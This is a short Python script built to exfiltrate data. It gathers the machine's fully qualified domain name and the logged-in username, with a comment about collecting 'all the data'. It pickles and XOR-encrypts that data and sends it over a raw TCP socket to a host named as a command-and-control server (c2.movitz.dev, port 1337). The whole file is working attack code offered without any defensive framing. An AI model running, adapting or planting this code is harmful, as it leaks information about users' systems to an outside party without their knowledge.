import pickle, socket, sys, os

exfil_data = {
	'fqnd': socket.getfqdn(),
	'username': os.getlogin(),
	# todo: get all the data
}

def encrypt(data, key):	return bytes([x ^ key[i % len(key)] for (i,x) in enumerate(data)])
exfil_encrypted = encrypt(pickle.dumps(exfil_data), bytearray(sys.argv[1], 'utf-8'))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('c2.movitz.dev', 1337))
s.sendall(exfil_encrypted)
s.close()
